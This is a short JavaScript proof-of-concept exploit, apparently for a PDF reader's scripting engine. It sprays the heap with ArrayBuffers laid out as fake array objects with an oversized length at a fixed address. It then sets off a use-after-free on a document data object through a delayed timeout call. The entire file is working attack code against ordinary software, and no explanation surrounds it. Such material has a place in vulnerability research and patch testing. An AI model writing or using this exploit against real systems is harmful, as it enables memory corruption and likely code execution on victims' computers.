console.show();

var FAKE_ARRAY_JSOBJ_ADDR = 0x5D000058;

var heapSpary = new Array(0x8000);
for (var i = 0; i < heapSpary.length; i++) {
    heapSpary[i] = new ArrayBuffer(0x10000 - 0x10 - 0x8);
    var tempDV = new DataView(heapSpary[i]);
    //shape
    tempDV.setUint32(0x0, FAKE_ARRAY_JSOBJ_ADDR + 0x10, true);
    //type
    tempDV.setUint32(0x4, FAKE_ARRAY_JSOBJ_ADDR + 0x14, true);
    //slot
    tempDV.setUint32(0x8, 0, true);
    //elements
    tempDV.setUint32(0xC, FAKE_ARRAY_JSOBJ_ADDR + 0x30, true);
    //flag
    tempDV.setUint32(0x20, 0, true);
    //initializedLenght  
    tempDV.setUint32(0x24, 0xFFFF, true);
    //capacity  
    tempDV.setUint32(0x28, 0xFFFF, true);
    //length
    tempDV.setUint32(0x2C, 0xFFFF, true);
}

var ESObjectSize = 0x50;

function triggerUAF() {
    this.dataObjects[0].toString();
}

function poc() {
    this.dataObjects[0].toString();
    this.dataObjects[0] = null;
    g_timeout = app.setTimeOut("triggerUAF()", 1000);
}

poc();